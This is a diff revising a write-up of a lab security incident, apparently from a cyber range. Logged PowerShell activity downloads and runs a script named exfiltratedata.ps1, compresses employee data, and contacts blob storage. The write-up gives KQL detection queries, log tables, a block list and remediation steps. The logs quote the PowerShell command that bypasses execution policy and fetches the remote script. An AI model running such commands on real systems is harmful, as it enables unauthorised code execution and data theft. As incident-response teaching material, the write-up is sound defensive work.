@@ -12,7 +12,7 @@
 
 ### Initial Alert
 
-The investigation started with an alert from Microsoft Sentinel for the rule "Detect Web-Request from Powershell.exe - PN." The alert was triggered by this query:
+The investigation began with an alert from Microsoft Sentinel for the rule "Detect Web-Request from Powershell.exe - PN". The alert triggered based on the following Sentinel scheduled query rule:
 
 ```kql
 DeviceProcessEvents
@@ -24,13 +24,13 @@ DeviceProcessEvents
 
 ![ir1](https://github.com/user-attachments/assets/1fab327c-eb1c-465a-99d7-83ac5688ca46)
 
-The query flagged the following suspicious command:
+This query detected the following suspicious command:
 
 ```powershell
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
 ```
 
-This command showed that a PowerShell script (exfiltratedata.ps1) was downloaded from the internet and saved to `C:\programdata`, which prompted further investigation.
+The command indicated that a PowerShell script (exfiltratedata.ps1) was downloaded from the internet to C:\ProgramData, a folder that is hidden by default on Windows. This suggests an attempt to conceal the file's presence and triggered further investigation.
 
 ### Relevant MITRE ATT&CK Techniques
 - **T1059.001**: Command and Scripting Interpreter: PowerShell
@@ -39,11 +39,11 @@ This command showed that a PowerShell script (exfiltratedata.ps1) was downloaded
 
 ### User Inquiry
 
-I spoke with the user of `ir-win10` to get some context. They mentioned trying to install something, seeing a black screen, and thinking "nothing happened." From this, it seemed likely they unknowingly ran a malicious script.
+I reached out to the user of ir-win10 to get some more context. They told me they had tried installing something, saw a black screen, and then said, "nothing happened afterward." This pointed to the possibility that a malicious script might have run without them realizing it.
 
 ### Process Events Analysis
 
-To verify if the script ran and identify any follow-up malicious actions, I checked process events with this query:
+To confirm the downloaded script's execution and identify further malicious activities, I queried process events:
 
 ```kql
 DeviceProcessEvents
@@ -56,16 +56,25 @@ DeviceProcessEvents
 
 **Findings:**
 
-The logs confirmed these events:
-1. The script `exfiltratedata.ps1` was downloaded and executed multiple times.
-2. A silent installation of 7-Zip using `7z2408-x64.exe` was carried out.
-3. 7-Zip was then used to compress sensitive data into ZIP files.
+**Note:** The placeholder [TIMESTAMP] represents generalized timestamps for repeated events. Refer to the screenshots for actual logs.
 
-This sequence strongly suggested malicious intent to exfiltrate sensitive information.
+| Timestamps                     | FileName         | FolderPath                                  | ProcessCommandLine                                        |
+|--------------------------------|------------------|--------------------------------------------|---------------------------------------------------------|
+| 8 Jan 2025 20:48:43, 19:48:40, 18:48:47 | 7z.exe           | C:\Program Files\7-Zip\                   | "7z.exe" a C:\ProgramData\employee-data-[TIMESTAMP].zip C:\ProgramData\employee-data-temp[TIMESTAMP].csv |
+| 8 Jan 2025 20:48:37, 19:48:32, 18:48:40 | 7z2408-x64.exe   | C:\ProgramData\                           | "7z2408-x64.exe" /S                                    |
+| 8 Jan 2025 20:48:35, 19:48:31, 18:48:38 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 |
+| 8 Jan 2025 20:48:31, 19:48:27, 18:48:35 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1 |
+
+These logs confirmed the following sequence of events:
+1. The script exfiltratedata.ps1 was downloaded and executed multiple times.
+2. The script installed 7-Zip silently using 7z2408-x64.exe.
+3. The installed 7-Zip (7z.exe) was used to compress sensitive data into ZIP files.
+
+This strongly indicated malicious intent to exfiltrate sensitive information.
 
 ### Network Events Analysis
 
-To check for data exfiltration, I queried network events:
+To identify any potential data exfiltration, I queried network events:
 
 ```kql
 DeviceNetworkEvents
@@ -78,11 +87,17 @@ DeviceNetworkEvents
 
 **Findings:**
 
-The logs revealed repeated connections to external endpoints, indicating potential data exfiltration.
+| Timestamp          | ActionType       | RemoteIP          | RemotePort | RemoteUrl                                      | CommandLine                                           |
+|--------------------|------------------|-------------------|------------|------------------------------------------------|-----------------------------------------------------|
+| 8 Jan 2025 18:48:47 | ConnectionSuccess | 20.60.133.132     | 443        | https://sacyberrangedanger.blob.core.windows.net | powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1    |
+| 8 Jan 2025 18:48:39 | ConnectionSuccess | 20.60.181.193     | 443        | https://sacyberrange00.blob.core.windows.net    | powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1    |
+| 8 Jan 2025 18:48:35 | ConnectionSuccess | 185.199.109.133   | 443        | https://raw.githubusercontent.com              | powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1 |
+
+These logs showed repeated connections to external endpoints, strongly supporting the hypothesis of data exfiltration.
 
 ### File Events Analysis
 
-Finally, I checked file events to locate evidence of data staging or exfiltration:
+To identify artifacts related to data staging or exfiltration, I queried file events:
 
 ```kql
 DeviceFileEvents
@@ -91,11 +106,18 @@ DeviceFileEvents
 | order by Timestamp desc
 ```
 
-![Filequery](https://github.com/user-attachments/assets/aba14b2e-9fbd-41aa-a33d-bfe771693a61)
-
 **Findings:**
 
-The repeated creation and renaming of ZIP files matched a pattern of staging files for exfiltration.
+![Filequery](https://github.com/user-attachments/assets/aba14b2e-9fbd-41aa-a33d-bfe771693a61)
+
+**Note:** The placeholder [TIMESTAMP] represents generalized timestamps for repeated events. Refer to the screenshots for actual logs.
+
+| Timestamps             | FileName                     | FolderPath                             | InitiatingProcessCommandLine                                          | ActionType |
+|--------------------------------|------------------------------|----------------------------------------|------------------------------------------------------------------------|------------|
+| 8 Jan 2025 20:48:44, 19:48:41, 18:48:47 | employee-data-[TIMESTAMP].zip | C:\ProgramData\backup\employee-data-[TIMESTAMP].zip | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 | FileRenamed |
+| 8 Jan 2025 20:48:43, 19:48:40, 18:48:47 | employee-data-[TIMESTAMP].zip | C:\ProgramData\employee-data-[TIMESTAMP].zip        | "7z.exe" a C:\ProgramData\employee-data-[TIMESTAMP].zip C:\ProgramData\employee-data-temp[TIMESTAMP].csv | FileCreated |
+
+These findings confirmed the repeated creation and renaming of ZIP files, consistent with attempts to stage data for exfiltration.
 
 ---
 
@@ -103,33 +125,34 @@ The repeated creation and renaming of ZIP files matched a pattern of staging fil
 
 ### Immediate Containment
 
-1. **Quarantine the Affected Device:**
-   - `ir-win10` was isolated from the network using Defender for Endpoint.
+1. **Quarantine Affected Device**:
+   - Isolated ir-win10 from the network with Defender for Endpoint.
 
-2. **Block Malicious IPs and URLs:**
-   - Blocked these IPs and domains:
-     - `185.199.109.133`
-     - `20.60.181.193`
-     - `20.60.133.132`
-     - `https://raw.githubusercontent.com`
-     - `https://sacyberrange00.blob.core.windows.net`
-     - `https://sacyberrangedanger.blob.core.windows.net`
+2. **Block Malicious IPs and URLs**:
+   - Blocked the following IPs and domains in the firewall:
+     - 185.199.109.133
+     - 20.60.181.193
+     - 20.60.133.132
+     - https://raw.githubusercontent.com
+     - https://sacyberrange00.blob.core.windows.net
+     - https://sacyberrangedanger.blob.core.windows.net
 
 ### Investigation and Remediation
 
-1. **Remove Malicious Files:**
-   - Deleted all instances of `exfiltratedata.ps1` and any related ZIP files.
+1. **Locate and Delete Malicious Artifacts**:
+   - Removed all instances of exfiltratedata.ps1 from C:\programdata.
+   - Deleted any related ZIP files (e.g., employee-data-*.zip) and temporary files.
 
-2. **Scan the System:**
-   - Performed a full system scan with Microsoft Defender for Endpoint.
+2. **Scan the System**:
+   - Performed a full system scan using Microsoft Defender for Endpoint.
 
-3. **Review Network Traffic:**
-   - Checked logs to confirm no sensitive data was successfully exfiltrated.
+3. **Analyze Network Traffic**:
+   - Inspected logs to confirm no sensitive data was exfiltrated.
 
-4. **Improve Endpoint Security:**
+4. **Harden Endpoint Security**:
    - Disabled PowerShell for non-administrative users.
-   - Tightened PowerShell execution policies.
-   - Added application whitelisting to block unauthorized executables.
+   - Enforced stricter PowerShell execution policies.
+   - Implemented application whitelisting to block unauthorized executables.
 
 ---
 
@@ -137,24 +160,25 @@ The repeated creation and renaming of ZIP files matched a pattern of staging fil
 
 ### Recommendations
 
-1. **Enhance Monitoring:**
-   - PowerShell activity logging is already in place, as seen from this alert. However, detection rules for unauthorized archiving tools and large file transfers should be added.
+1. **Enhance Monitoring**:
+   - Note: PowerShell activity logging is already implemented, as evidenced by the alert triggered in this investigation.
+   - Create detection rules for unauthorized archiving tools and large file transfers.
 
-2. **Educate Users:**
-   - Train employees to recognize suspicious activity and follow company policies for running scripts.
+2. **User Education**:
+   - Train users to recognize suspicious activity.
+   - Reinforce company policies against running untrusted scripts.
 
-3. **Document Findings:**
-   - Record findings and update the incident response playbook with lessons learned.
+3. **Incident Documentation**:
+   - Record all findings and actions taken.
+   - Update incident response playbooks to include lessons learned.
 
 ### Post-Incident Monitoring
 
 - Keep ir-win10 under close monitoring post-remediation.
-- Perform network-wide scans to ensure no other devices are compromised.
+- Conduct network-wide scans to ensure no other devices were compromised.
 
 ---
 
 ## Closure
 
-This incident was effectively handled, contained, eradicated, and resolved. Documentation has been updated, and the lessons learned have been integrated into our response playbook to strengthen future readiness.
-
-
+The incident was successfully contained, eradicated, and the affected device fully recovered. Documentation has been updated with findings, actions taken, and recommendations. Lessons learned have been incorporated into the organization’s incident response playbooks to improve future response capabilities.
